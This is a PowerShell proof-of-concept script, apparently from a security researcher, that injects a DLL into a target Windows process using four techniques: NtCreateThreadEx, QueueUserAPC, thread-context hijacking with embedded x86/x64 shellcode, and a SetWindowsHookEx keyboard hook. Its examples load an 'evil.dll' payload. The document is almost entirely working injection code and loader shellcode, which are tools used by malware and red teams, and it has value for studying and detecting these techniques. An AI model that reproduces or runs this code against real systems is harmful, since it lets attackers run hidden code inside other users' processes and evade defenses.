function Stage-RemoteDll {
<#
.SYNOPSIS
	Stage-RemoteDll is a small function to demonstrate various Dll injection techniques
	(NtCreateThreadEx / QueueUserAPC / SetThreadContext / SetWindowsHookEx) on 32 and
	64 bit architectures. While I have done some input validation & cleanup, this is
	mostly POC code. Note also that these techniques can easily be repurposed to
	directly execute shellcode in the remote process.

	Notes:
		- I tested these techniques using notepad on Win10 x64 RS2 and Win7 x32 SP1,
		  the recommended testing platform being Win10 x64.
		- All methods can execute code from DllMain (DLL_PROCESS_ATTACH). Additionally,
		  SetWindowsHookEx places a WH_KEYBOARD hook procedure into the hook chain
		  which will execute an exported Dll function when pressing a key while the
		  main application window is in focus.
	
	Caveats:
		- I found that SetWindowsHookEx was not working on Win7 x32. If anyone has any
		  ideas I will update the script.
	
	Reference:
		- I wrote this mostly to educate myself, the contents of this script are based
		  on an excellent post by @fdiskyou => http://blog.deniable.org/blog/2017/07/16/inject-all-the-things/

.DESCRIPTION
	Author: Ruben Boonen (@FuzzySec)
	License: BSD 3-Clause
	Required Dependencies: None
	Optional Dependencies: None

.PARAMETER ProcID
	PID of the target process.

.PARAMETER DllPath
	Path to the Dll (relative or full).

.PARAMETER Mode
	NtCreateThreadEx / QueueUserAPC / SetThreadContext / SetWindowsHookEx.

.PARAMETER ExportedFunction
	Exported function name in the Dll.

.EXAMPLE
	# Boolean return value
	C:\PS> $CallResult = Stage-RemoteDll -ProcID 1337 -DllPath .\Desktop\evil.dll -Mode NtCreateThreadEx
	C:\PS> $CallResult
	True

.EXAMPLE
	C:\PS> Stage-RemoteDll -ProcID 1337 -DllPath .\Desktop\evil.dll -Mode NtCreateThreadEx -Verbose
	VERBOSE: [+] Using NtCreateThreadEx
	VERBOSE: [>] Opening notepad
	VERBOSE: [>] Allocating DLL path memory
	VERBOSE: [>] Writing DLL string
	VERBOSE: [>] Locating LoadLibraryA
	VERBOSE: [>] Creating remote thread
	VERBOSE: [>] Cleaning up..
	True

.EXAMPLE
	C:\PS> Stage-RemoteDll -ProcID 1337 -DllPath .\Desktop\evil.dll -Mode QueueUserAPC -Verbose
	VERBOSE: [+] Using QueueUserAPC
	VERBOSE: [>] Opening notepad
	VERBOSE: [>] Allocating DLL path memory
	VERBOSE: [>] Writing DLL string
	VERBOSE: [>] Locating LoadLibraryA
	VERBOSE: [>] Getting process threads
	VERBOSE: [>] Registering APC's with all threads
	VERBOSE:   --> Success, registered APC
	VERBOSE:   --> Success, registered APC
	VERBOSE:   --> Success, registered APC
	VERBOSE:   --> Success, registered APC
	VERBOSE: [>] Cleaning up..
	True

.EXAMPLE
	C:\PS> Stage-RemoteDll -ProcID 1337 -DllPath .\Desktop\evil.dll -Mode SetThreadContext -Verbose
	VERBOSE: [+] Using SetThreadContext
	VERBOSE: [>] Opening notepad
	VERBOSE: [>] Allocating shellcode memory
	VERBOSE: [>] Allocating DLL path memory
	VERBOSE: [>] Writing DLL string
	VERBOSE: [>] Locating LoadLibraryA
	VERBOSE: [>] Getting a process TID
	VERBOSE: [>] Opening process TID
	VERBOSE: [>] Suspending thread
	VERBOSE: [>] Rewriting thread context
	VERBOSE: [>] Allocating shellcode
	VERBOSE: [>] Setting thread context & resuming
	VERBOSE: [>] Cleaning up..
	True

.EXAMPLE
	C:\PS> Stage-RemoteDll -ProcID 1337 -DllPath .\Desktop\evil.dll -Mode SetWindowsHookEx -ExportedFunction pwnfunc -Verbose
	VERBOSE: [+] Using SetWindowsHookEx
	VERBOSE: [>] Loading payload DLL
	VERBOSE: [>] Locating exported function
	VERBOSE: [>] Locating process main window handle
	VERBOSE: [>] Locating main window thread
	VERBOSE: [>] Installing WH_KEYBOARD hook procedure
	VERBOSE: [>] Waiting to release hook
	VERBOSE: [>] Remote process executed hook
	VERBOSE: [>] Cleaning up..
	True
#>
	[CmdletBinding()]
	param (
		[Parameter(Mandatory = $True)]
		[int]$ProcID,
		[Parameter(Mandatory = $True)]
		[string]$DllPath,
		[Parameter(Mandatory = $True)]
		[ValidateSet(
			'NtCreateThreadEx',
			'QueueUserAPC',
			'SetThreadContext',
			'SetWindowsHookEx')
		]
		[string]$Mode,
		[Parameter(Mandatory = $False)]
		[string]$ExportedFunction
	)

	# Set inline CONTEXT32 or CONTEXT64
	if (${Env:ProgramFiles(x86)}) {
		$ContextStruct = "CONTEXT64"
	} else {
		$ContextStruct = "CONTEXT32"
	}

	Add-Type -TypeDefinition @"
	using System;
	using System.Diagnostics;
	using System.Runtime.InteropServices;
	using System.Security.Principal;

	[StructLayout(LayoutKind.Sequential)]
	public struct FLOATING_SAVE_AREA
	{
		public uint ControlWord; 
		public uint StatusWord; 
		public uint TagWord; 
		public uint ErrorOffset; 
		public uint ErrorSelector; 
		public uint DataOffset;
		public uint DataSelector; 
		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)] 
		public byte[] RegisterArea; 
		public uint Cr0NpxState; 
	}

	[StructLayout(LayoutKind.Sequential)]
	public struct CONTEXT32
	{
		public uint ContextFlags;
		public uint Dr0;  
		public uint Dr1; 
		public uint Dr2; 
		public uint Dr3; 
		public uint Dr6; 
		public uint Dr7; 
		public FLOATING_SAVE_AREA FloatSave; 
		public uint SegGs; 
		public uint SegFs; 
		public uint SegEs; 
		public uint SegDs; 
		public uint Edi; 
		public uint Esi; 
		public uint Ebx; 
		public uint Edx; 
		public uint Ecx; 
		public uint Eax; 
		public uint Ebp; 
		public uint Eip; 
		public uint SegCs; 
		public uint EFlags;
		public uint Esp; 
		public uint SegSs;
		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)] 
		public byte[] ExtendedRegisters;
	}

	[StructLayout(LayoutKind.Explicit, Size=0x4d0)]
	public struct CONTEXT64
	{
		[FieldOffset(0x0)] public ulong P1Home;
		[FieldOffset(0x8)] public ulong P2Home;
		[FieldOffset(0x10)] public ulong P3Home;
		[FieldOffset(0x18)] public ulong P4Home;
		[FieldOffset(0x20)] public ulong P5Home;
		[FieldOffset(0x28)] public ulong P6Home;
		[FieldOffset(0x30)] public uint ContextFlags;
		[FieldOffset(0x34)] public uint MxCsr;
		[FieldOffset(0x38)] public ushort SegCs;
		[FieldOffset(0x3a)] public ushort SegDs;
		[FieldOffset(0x3c)] public ushort SegEs;
		[FieldOffset(0x3e)] public ushort SegFs;
		[FieldOffset(0x40)] public ushort SegGs;
		[FieldOffset(0x42)] public ushort SegSs;
		[FieldOffset(0x44)] public uint EFlags;
		[FieldOffset(0x48)] public ulong Dr0;
		[FieldOffset(0x50)] public ulong Dr1;
		[FieldOffset(0x58)] public ulong Dr2;
		[FieldOffset(0x60)] public ulong Dr3;
		[FieldOffset(0x68)] public ulong Dr6;
		[FieldOffset(0x70)] public ulong Dr7;
		[FieldOffset(0x78)] public ulong Rax;
		[FieldOffset(0x80)] public ulong Rcx;
		[FieldOffset(0x88)] public ulong Rdx;
		[FieldOffset(0x90)] public ulong Rbx;
		[FieldOffset(0x98)] public ulong Rsp;
		[FieldOffset(0xa0)] public ulong Rbp;
		[FieldOffset(0xa8)] public ulong Rsi;
		[FieldOffset(0xb0)] public ulong Rdi;
		[FieldOffset(0xb8)] public ulong R8;
		[FieldOffset(0xc0)] public ulong R9;
		[FieldOffset(0xc8)] public ulong R10;
		[FieldOffset(0xd0)] public ulong R11;
		[FieldOffset(0xd8)] public ulong R12;
		[FieldOffset(0xe0)] public ulong R13;
		[FieldOffset(0xe8)] public ulong R14;
		[FieldOffset(0xf0)] public ulong R15;
		[FieldOffset(0xf8)] public ulong Rip;
		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 976)] 
		[FieldOffset(0x100)] public byte[] ExtendedRegisters;
	}

	public static class Inject
	{
		/// NtDll

		[DllImport("ntdll.dll")]
		public static extern UInt32 NtCreateThreadEx(
			ref IntPtr hThread,
			UInt32 DesiredAccess,
			IntPtr ObjectAttributes,
			IntPtr ProcessHandle,
			IntPtr lpStartAddress,
			IntPtr lpParameter,
			bool CreateSuspended,
			UInt32 StackZeroBits,
			UInt32 SizeOfStackCommit,
			UInt32 SizeOfStackReserve,
			IntPtr lpBytesBuffer);

		/// Kernel32

		[DllImport("kernel32.dll")]
		public static extern IntPtr OpenProcess(
			UInt32 processAccess,
			bool bInheritHandle,
			int processId);

		[DllImport("kernel32.dll")]
		public static extern IntPtr VirtualAllocEx(
			IntPtr hProcess,
			IntPtr lpAddress,
			uint dwSize,
			int flAllocationType,
			int flProtect);

		[DllImport("kernel32.dll", SetLastError=true, ExactSpelling=true)]
		public static extern bool VirtualFreeEx(
			IntPtr hProcess,
			IntPtr lpAddress,
			UInt32 dwSize,
			UInt32 dwFreeType);

		[DllImport("kernel32.dll")]
		public static extern bool WriteProcessMemory(
			IntPtr hProcess,
			IntPtr lpBaseAddress,
			byte[] lpBuffer,
			uint nSize,
			ref UInt32 lpNumberOfBytesWritten);

		[DllImport("kernel32.dll", CharSet=CharSet.Auto)]
		public static extern IntPtr GetModuleHandle(
			string lpModuleName);

		[DllImport("kernel32", CharSet=CharSet.Ansi)]
		public static extern IntPtr GetProcAddress(
			IntPtr hModule,
			string procName);

		[DllImport("kernel32.dll")]
		public static extern UInt32 WaitForSingleObject(
			IntPtr hHandle,
			UInt32 dwMilliseconds);

		[DllImport("kernel32.dll")]
		public static extern bool VirtualFreeEx(
			IntPtr hProcess,
			IntPtr lpAddress,
			int dwSize,
			int dwFreeType);

		[DllImport("kernel32.dll")]
		public static extern bool CloseHandle(
			IntPtr hObject);

		[DllImport("kernel32.dll")]
		public static extern IntPtr OpenThread(
			UInt32 dwDesiredAccess,
			bool bInheritHandle,
			uint dwThreadId);

		[DllImport("kernel32.dll")]
		public static extern bool QueueUserAPC(
			IntPtr pfnAPC,
			IntPtr hThread,
			IntPtr dwData);

		[DllImport("kernel32.dll")]
		public static extern bool IsWow64Process(
			IntPtr hProcess,
			ref bool Wow64Process);

		[DllImport("kernel32.dll")]
		public static extern int SuspendThread(
			IntPtr hThread);

		[DllImport("kernel32.dll")]
		public static extern bool GetThreadContext(
			IntPtr hThread,
			ref $ContextStruct lpContext);

		[DllImport("kernel32.dll")]
		public static extern bool SetThreadContext(
			IntPtr hThread,
			ref $ContextStruct lpContext);

		[DllImport("kernel32.dll")]
		public static extern uint ResumeThread(
			IntPtr hThread);

		[DllImport("kernel32.dll")]
		public static extern IntPtr LoadLibraryEx(
			string lpFileName,
			IntPtr hReservedNull,
			int dwFlags);

		/// User32

		[DllImport("user32.dll")]
		public static extern uint GetWindowThreadProcessId(
			IntPtr hWnd,
			ref uint lpdwProcessId);

		[DllImport("user32.dll")]
		public static extern IntPtr SetWindowsHookEx(
			int hookType,
			IntPtr lpfn,
			IntPtr hMod,
			uint dwThreadId);

		[DllImport("user32.dll")]
		public static extern bool UnhookWindowsHookEx(
			IntPtr hhk);
	}
"@

	function Invoke-AllTheChecks {
		# Setup Dll vars
		try {
			$DllPath = (Resolve-Path $DllPath -ErrorAction Stop).Path
			$AsciiDllPathArray = (New-Object System.Text.ASCIIEncoding).GetBytes($DllPath)
			# Check Dll arch
			$DllBytes = [System.IO.File]::ReadAllBytes($DllPath)
			$Pe = [Int32] ('0x{0}' -f (($DllBytes[63..60] | % {$_.ToString('X2')}) -join ''))
			$PeArch = [UInt16] ('0x{0}' -f (($DllBytes[($Pe+24+1)..($Pe+24)] | % {$_.ToString('X2')}) -join ''))
		} catch {
			$DllPath = $false
			$AsciiDllPathArray = $false
			$PeArch = $false
		}
		# Check PowerShell proc architecture
		if ([IntPtr]::Size -eq 4) {
			$PoshIs32 = $true
		} else {
			$PoshIs32 = $false
		}
		# Check machine architecture
		if (${Env:ProgramFiles(x86)}) {
			$OsIs32 = $false
		} else {
			$OsIs32 = $true
		}
		# Check PID exists
		$GetProc = Get-Process -Id $ProcID -ErrorAction SilentlyContinue
		if ($GetProc) {
			$ProcIsValid = $true
			# Get PID architecture
			if ($OsIs32 -eq $false) {
				# PROCESS_QUERY_LIMITED_INFORMATION
				$hProc = [Inject]::OpenProcess(0x1000,$false,$ProcID)
				$ProcIs32 = $False
				$CallResult = [Inject]::IsWow64Process($hProc,[ref]$ProcIs32)
				$CallResult = [Inject]::CloseHandle($hProc)
			} else {
				$ProcIs32 = $true
			}
		} else {
			$ProcIsValid = $false
		}
		
		$HashTable = @{
			DllPath = $DllPath
			DllArch = $PeArch # 267=0x010b=x32/523=0x020b=x64
			AsciiDllPathArray = $AsciiDllPathArray
			PoshIs32 = $PoshIs32
			OsIs32 = $OsIs32
			ProcIsValid = $ProcIsValid
			ProcIs32 = $ProcIs32
		}
		New-Object PSObject -Property $HashTable
	}
	
	# Do some input validation on function args
	$PreRunChecks = Invoke-AllTheChecks
	if ($PreRunChecks.ProcIsValid -eq $false) {
		Write-Verbose "[!] Invalid process specified.."
		$false
		Return
	}
	if ($PreRunChecks.DllPath -eq $false) {
		Write-Verbose "[!] Invalid Dll path specified.."
		$false
		Return
	}
	if ($PreRunChecks.ProcIs32 -eq $true -And $PreRunChecks.DllArch -eq 0x20b) {
		Write-Verbose "[!] Cannot inject x64 Dll into x32 process.."
		$false
		Return
	}
	if ($PreRunChecks.ProcIs32 -eq $false -And $PreRunChecks.DllArch -eq 0x10b) {
		Write-Verbose "[!] Cannot inject x32 Dll into x64 process.."
		$false
		Return
	}
	if ($PreRunChecks.OsIs32 -eq $false -And $PreRunChecks.ProcIs32 -eq $true) {
		Write-Verbose "[!] Cannot inject into x32 process on x64 OS.."
		$false
		Return
	}
	if ($PreRunChecks.OsIs32 -eq $false -And $PreRunChecks.PoshIs32 -eq $true) {
		Write-Verbose "[!] Cannot inject from x32 PowerShell on x64 OS.."
		$false
		Return
	}
	if ($Mode -eq "SetWindowsHookEx" -And !$ExportedFunction) {
		Write-Verbose "[!] Calling SetWindowsHookEx requires an exported function.."
		$false
		Return
	}

	if ($Mode -eq "NtCreateThreadEx") {
		# Print method
		Write-Verbose "[+] Using NtCreateThreadEx"

		## Get process handle
		# => PROCESS_QUERY_INFORMATION|PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION|PROCESS_VM_WRITE
		#--------
		Write-Verbose "[>] Opening $($(Get-Process -PID $ProcID).ProcessName)"
		$hProc = [Inject]::OpenProcess(0x42A,$false,$ProcID)
		if ($hProc -eq [IntPtr]::Zero) {
			Write-Verbose "[!] OpenProcess failed.."
			$false
			Return
		}
		
		## Alloc Dll string
		#--------
		Write-Verbose "[>] Allocating DLL path memory"
		$pRemoteAlloc = [Inject]::VirtualAllocEx($hProc,[IntPtr]::Zero,$PreRunChecks.DllPath.Length,0x3000,4)
		if ($pRemoteAlloc -eq [IntPtr]::Zero) {
			Write-Verbose "[!] VirtualAllocEx failed.."
			$false
			Return
		}
		
		## Write Dll String
		#--------
		Write-Verbose "[>] Writing DLL string"
		$CallResult = [Inject]::WriteProcessMemory($hProc,$pRemoteAlloc,$PreRunChecks.AsciiDllPathArray,$PreRunChecks.DllPath.Length,[ref]0)
		if (!$CallResult) {
			Write-Verbose "[!] WriteProcessMemory failed.."
			$false
			Return
		}
		
		## Get LoadLibraryA
		#--------
		Write-Verbose "[>] Locating LoadLibraryA"
		$pLoadLibraryA = [Inject]::GetProcAddress($([Inject]::GetModuleHandle("kernel32.dll")),"LoadLibraryA")
		if ($pLoadLibraryA -eq [IntPtr]::Zero) {
			Write-Verbose "[!] GetProcAddress failed.."
			$false
			Return
		}
		
		## Create Thread
		#--------
		Write-Verbose "[>] Creating remote thread"
		$hRemoteThread = [IntPtr]::Zero
		$CallResult = [Inject]::NtCreateThreadEx([ref]$hRemoteThread,0x1FFFFF,[IntPtr]::Zero,$hProc,$pLoadLibraryA,$pRemoteAlloc,$false,0,0xffff,0xffff,[IntPtr]::Zero)
		if ($hRemoteThread -eq [IntPtr]::Zero) {
			Write-Verbose "[!] NtCreateThreadEx failed.."
			$false
			Return
		} else {
			Start-Sleep -s 2 # Not sure if needed, to ensure our thread finishes
							 # before we free. Can also use WaitForSingleObject
							 # but there is no added benefit..
		}
		
		## Clean up
		#--------
		Write-Verbose "[>] Cleaning up.."
		$CallResult = [Inject]::VirtualFreeEx($hProc,$pRemoteAlloc,$PreRunChecks.DllPath.Length,0x8000) # MEM_RELEASE (0x8000)
		$CallResult = [Inject]::CloseHandle($hRemoteThread)
		$CallResult = [Inject]::CloseHandle($hProc)
		$true
	}

	if ($Mode -eq "QueueUserAPC") {
		# Print method
		Write-Verbose "[+] Using QueueUserAPC"

		## Get process handle
		# => PROCESS_VM_OPERATION|PROCESS_VM_WRITE
		#--------
		Write-Verbose "[>] Opening $($(Get-Process -PID $ProcID).ProcessName)"
		$hProc = [Inject]::OpenProcess(0x28,$false,$ProcID)
		if ($hProc -eq [IntPtr]::Zero) {
			Write-Verbose "[!] OpenProcess failed.."
			$false
			Return
		}

		## Alloc Dll string
		#--------
		Write-Verbose "[>] Allocating DLL path memory"
		$pRemoteAlloc = [Inject]::VirtualAllocEx($hProc,[IntPtr]::Zero,$PreRunChecks.DllPath.Length,0x3000,4)
		if ($pRemoteAlloc -eq [IntPtr]::Zero) {
			Write-Verbose "[!] VirtualAllocEx failed.."
			$false
			Return
		}

		## Write Dll String
		#--------
		Write-Verbose "[>] Writing DLL string"
		$CallResult = [Inject]::WriteProcessMemory($hProc,$pRemoteAlloc,$PreRunChecks.AsciiDllPathArray,$PreRunChecks.DllPath.Length,[ref]0)
		if (!$CallResult) {
			Write-Verbose "[!] WriteProcessMemory failed.."
			$false
			Return
		}

		## Get LoadLibraryA
		#--------
		Write-Verbose "[>] Locating LoadLibraryA"
		$pLoadLibraryA = [Inject]::GetProcAddress($([Inject]::GetModuleHandle("kernel32.dll")),"LoadLibraryA")
		if ($pLoadLibraryA -eq [IntPtr]::Zero) {
			Write-Verbose "[!] GetProcAddress failed.."
			$false
			Return
		}
		
		## Get Process TID's
		#--------
		Write-Verbose "[>] Getting process threads"
		$ProcTIDs = (Get-Process -Id $ProcID).Threads |Select -ExpandProperty Id
		if ($ProcTIDs -eq 0) {
			Write-Verbose "[!] No threads found in the target process"
			$false
			Return
		}
		
		## Open TID's and register APC
		#--------
		Write-Verbose "[>] Registering APC's with all threads"
		$ProcTIDs |ForEach-Object {
			# THREAD_SET_CONTEXT
			$hThread = [Inject]::OpenThread(0x10,$false,$_)
			if ($hThread -eq [IntPtr]::Zero) {
				Write-Verbose "  --> OpenThread failed.."
			} else {
				# Register APC
				$CallResult = [Inject]::QueueUserAPC($pLoadLibraryA,$hThread,$pRemoteAlloc)
				if (!$CallResult) {
					Write-Verbose "  --> QueueUserAPC failed.."
				} else {
					Write-Verbose "  --> Success, registered APC"
					$CallResult = [Inject]::CloseHandle($hThread)
				}
			}
		}
		
		## Clean up
		#--------
		Write-Verbose "[>] Cleaning up.."
		$CallResult = [Inject]::CloseHandle($hProc)
		$true
	}

	if ($Mode -eq "SetThreadContext") {
		# Print method
		Write-Verbose "[+] Using SetThreadContext"

		## Get process handle
		# => PROCESS_ALL_ACCESS
		#--------
		Write-Verbose "[>] Opening $($(Get-Process -PID $ProcID).ProcessName)"
		$hProc = [Inject]::OpenProcess(0x1F0FFF,$false,$ProcID)
		if ($hProc -eq [IntPtr]::Zero) {
			Write-Verbose "[!] OpenProcess failed.."
			$false
			Return
		}

		## Alloc ScLoadLib space
		#--------
		Write-Verbose "[>] Allocating shellcode memory"
		if ($PreRunChecks.OsIs32 -eq $true) {
			$pRemoteScLoadLib = [Inject]::VirtualAllocEx($hProc,[IntPtr]::Zero,0x16,0x1000,0x40)
		} else {
			$pRemoteScLoadLib = [Inject]::VirtualAllocEx($hProc,[IntPtr]::Zero,0x57,0x1000,0x40)
		}
		if ($pRemoteScLoadLib -eq [IntPtr]::Zero) {
			Write-Verbose "[!] VirtualAllocEx failed.."
			$false
			Return
		}

		## Alloc Dll string
		#--------
		Write-Verbose "[>] Allocating DLL path memory"
		$pRemoteDll = [Inject]::VirtualAllocEx($hProc,[IntPtr]::Zero,$PreRunChecks.DllPath.Length,0x3000,0x40)
		if ($pRemoteDll -eq [IntPtr]::Zero) {
			Write-Verbose "[!] VirtualAllocEx failed.."
			$false
			Return
		}

		## Write Dll String
		#--------
		Write-Verbose "[>] Writing DLL string"
		$CallResult = [Inject]::WriteProcessMemory($hProc,$pRemoteDll,$PreRunChecks.AsciiDllPathArray,$PreRunChecks.DllPath.Length,[ref]0)
		if (!$CallResult) {
			Write-Verbose "[!] WriteProcessMemory failed.."
			$false
			Return
		}
		
		## Get LoadLibraryA
		#--------
		Write-Verbose "[>] Locating LoadLibraryA"
		$pLoadLibraryA = [Inject]::GetProcAddress($([Inject]::GetModuleHandle("kernel32.dll")),"LoadLibraryA")
		if ($pLoadLibraryA -eq [IntPtr]::Zero) {
			Write-Verbose "[!] GetProcAddress failed.."
			$false
			Return
		}

		## Get a TID for the process
		#--------
		Write-Verbose "[>] Getting a process TID"
		$ProcTID = ((Get-Process -Id $ProcID).Threads)[0].Id
		if (!$ProcTID) {
			Write-Verbose "[!] No threads found in the target process.."
			$false
			Return
		}

		## Suspend TID and get context
		#--------
		# THREAD_GET_CONTEXT|THREAD_SET_CONTEXT|THREAD_SUSPEND_RESUME
		Write-Verbose "[>] Opening process TID"
		$hThread = [Inject]::OpenThread(0x1A,$false,$ProcTID)
		if ($hThread -eq [IntPtr]::Zero) {
			Write-Verbose "[!] OpenThread failed.."
			$false
			Return
		} else {
			Write-Verbose "[>] Suspending thread"
			$CallResult = [Inject]::SuspendThread($hThread)
			if ($CallResult -eq -1) {
				Write-Verbose "[!] SuspendThread failed.."
				$false
				Return
			}
			$CONTEXT = New-Object $ContextStruct
			$CONTEXT.ContextFlags = 0x10001
			$CallResult = [Inject]::GetThreadContext($hThread,[ref]$CONTEXT)
			Write-Verbose "[>] Rewriting thread context"
			if ($CallResult -eq $false) {
				Write-Verbose "[!] GetThreadContext failed.."
				$false
				Return
			} else {
				if ($PreRunChecks.OsIs32 -eq $true) {
					$CurrentIP = $CONTEXT.Eip
					$CONTEXT.Eip = [Int32]$pRemoteScLoadLib
					$CONTEXT.ContextFlags = 0x10001
				} else {
					$CurrentIP = $CONTEXT.Rip
					$CONTEXT.Rip = [Int64]$pRemoteScLoadLib
					$CONTEXT.ContextFlags = 0x10001
				}
			}
		}

		## Fill in ScLoadLib vars
		#--------
		if ($PreRunChecks.ProcIs32 -eq $true) {
			# 32bit loader (Size:22/0x16)
			$ScLoadLib = [Byte[]] @(
				0x68) + [System.BitConverter]::GetBytes([Int32]$CurrentIP) + @(     # push ReturnAddress
				0x9c,                                                               # pushfd
				0x60,                                                               # pushad
				0x68) + [System.BitConverter]::GetBytes([Int32]$pRemoteDll) + @(    # push pDllPath
				0xb8) + [System.BitConverter]::GetBytes([Int32]$pLoadLibraryA) + @( # mov eax, LoadLibraryA
				0xff, 0xd0,                                                         # call eax
				0x61,                                                               # popad
				0x9d,                                                               # popfd
				0xc3                                                                # ret
			)
		} else {
			# 64bit loader (Size:87/0x57)
			$ScLoadLib = [Byte[]] @(
				0x50,                                                                     # push rax (save rax)
				0x48, 0xB8) + [System.BitConverter]::GetBytes([Int64]$CurrentIP) + @(     # mov rax, ReturnAddress
				0x9c,                                                                     # pushfq
				0x51,                                                                     # push rcx
				0x52,                                                                     # push rdx
				0x53,                                                                     # push rbx
				0x55,                                                                     # push rbp
				0x56,                                                                     # push rsi
				0x57,                                                                     # push rdi
				0x41, 0x50,                                                               # push r8
				0x41, 0x51,                                                               # push r9
				0x41, 0x52,                                                               # push r10
				0x41, 0x53,                                                               # push r11
				0x41, 0x54,                                                               # push r12
				0x41, 0x55,                                                               # push r13
				0x41, 0x56,                                                               # push r14
				0x41, 0x57,                                                               # push r15
				0x68, 0xef,0xbe,0xad,0xde,                                                # ShadowStack
				0x48, 0xB9) + [System.BitConverter]::GetBytes([Int64]$pRemoteDll) + @(    # mov rcx, pDllPath
				0x48, 0xB8) + [System.BitConverter]::GetBytes([Int64]$pLoadLibraryA) + @( # mov rax, LoadLibraryA
				0xFF, 0xD0,                                                               # call rax
				0x58,                                                                     # pop dummy
				0x41, 0x5F,                                                               # pop r15
				0x41, 0x5E,                                                               # pop r14
				0x41, 0x5D,                                                               # pop r13
				0x41, 0x5C,                                                               # pop r12
				0x41, 0x5B,                                                               # pop r11
				0x41, 0x5A,                                                               # pop r10
				0x41, 0x59,                                                               # pop r9
				0x41, 0x58,                                                               # pop r8
				0x5F,                                                                     # pop rdi
				0x5E,                                                                     # pop rsi
				0x5D,                                                                     # pop rbp
				0x5B,                                                                     # pop rbx
				0x5A,                                                                     # pop rdx
				0x59,                                                                     # pop rcx
				0x9D,                                                                     # popfq
				0x58,                                                                     # pop rax
				0xC3                                                                      # ret
			)
		}

		## Write ScLoadLib
		#--------
		Write-Verbose "[>] Allocating shellcode"
		$CallResult = [Inject]::WriteProcessMemory($hProc,$pRemoteScLoadLib,$ScLoadLib,$ScLoadLib.Length,[ref]0)
		if (!$CallResult) {
			Write-Verbose "[!] WriteProcessMemory failed.."
			$false
			Return
		}

		## SetThreadContext & ResumeThread
		#--------
		Write-Verbose "[>] Setting thread context & resuming"
		$CallResult = [Inject]::SetThreadContext($hThread,[ref]$CONTEXT)
		if (!$CallResult) {
			Write-Verbose "[!] SetThreadContext failed.."
			$false
			Return
		}
		$CallResult = [Inject]::ResumeThread($hThread)
		if ($CallResult -eq -1) {
			Write-Verbose "[!] ResumeThread failed.."
			$false
			Return
		}

		## Clean up
		#--------
		Write-Verbose "[>] Cleaning up.."
		Start-Sleep -s 4 # Wait for shellcode to run
		$CallResult = [Inject]::VirtualFreeEx($hProc,$pRemoteDll,$PreRunChecks.DllPath.Length,0x8000) # MEM_RELEASE (0x8000)
		if ($PreRunChecks.OsIs32 -eq $true) {
			$CallResult = [Inject]::VirtualFreeEx($hProc,$pRemoteScLoadLib,0x16,0x8000)
		} else {
			$CallResult = [Inject]::VirtualFreeEx($hProc,$pRemoteScLoadLib,0x57,0x8000)
		}
		$CallResult = [Inject]::CloseHandle($hThread)
		$CallResult = [Inject]::CloseHandle($hProc)
		$true
	}

	if ($Mode -eq "SetWindowsHookEx") {
		# Print method
		Write-Verbose "[+] Using SetWindowsHookEx"

		## Locally load payload dll
		#--------
		Write-Verbose "[>] Loading payload DLL"
		$hDll = [Inject]::LoadLibraryEx($PreRunChecks.DllPath,[IntPtr]::Zero,0x1)
		if ($hDll -eq [IntPtr]::Zero) {
			Write-Verbose "[!] LoadLibraryEx failed.."
			$false
			Return
		}

		## pExportedFunc
		#--------
		Write-Verbose "[>] Locating exported function"
		$pExportedFunc = [Inject]::GetProcAddress($hDll,$ExportedFunction)
		if ($pExportedFunc -eq [IntPtr]::Zero) {
			Write-Verbose "[!] GetProcAddress failed.."
			$false
			Return
		}

		## Get main window handle for proc
		#--------
		Write-Verbose "[>] Locating process main window handle"
		$hWindProc = (Get-Process -Id $ProcID).MainWindowHandle
		if (!$hWindProc) {
			Write-Verbose "[!] No Windows found for the target process.."
			$false
			Return
		}

		## Get TID for main Window handle
		#--------
		Write-Verbose "[>] Locating main window thread"
		$TargetPid = 0
		$WndTID = [Inject]::GetWindowThreadProcessId($hWindProc,[ref]$TargetPid)
		if ($WndTID -eq 0) {
			Write-Verbose "[!] GetWindowThreadProcessId failed.."
			$false
			Return
		}

		## Install WH_KEYBOARD hook
		#--------
		Write-Verbose "[>] Installing WH_KEYBOARD hook procedure"
		$hHook = [Inject]::SetWindowsHookEx(0x2,$pExportedFunc,$hDll,$WndTID)
		if ($hHook -eq [IntPtr]::Zero) {
			Write-Verbose "[!] SetWindowsHookEx failed.."
			$false
			Return
		}

		## Clean up
		#--------
		Write-Verbose "[>] Waiting to release hook"
		$DllName = ($DllPath -split "\\")[-1]
		while ($((Get-process -Id $ProcID).Modules |Select -ExpandProperty ModuleName) -notcontains $DllName) {
			Start-Sleep -Milliseconds 500
		}
		Write-Verbose "[>] Remote process executed hook"
		Write-Verbose "[>] Cleaning up.."
		$CallResult = [Inject]::UnhookWindowsHookEx($hHook)
		$CallResult = [Inject]::CloseHandle($hDll)
		$true
	}
}